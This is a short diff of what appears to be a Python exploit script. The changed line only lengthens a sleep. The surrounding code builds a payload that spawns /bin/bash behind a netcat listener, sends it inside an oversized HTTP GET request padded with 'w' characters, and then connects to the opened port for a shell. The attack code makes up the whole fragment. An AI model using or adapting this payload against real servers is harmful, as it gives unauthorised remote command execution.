@@ -25,7 +25,7 @@ p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 "+sys.argv[2]+" <&$
 #p += pack('<I', 0x00000000)
 sock.sendall("GET /"+" "+'w'*119+p+"\r\n\r\n")
 
-time.sleep(2)
+time.sleep(5)
 
 port = int(sys.argv[2])
 sock = socket.create_connection(('127.0.0.1', port),
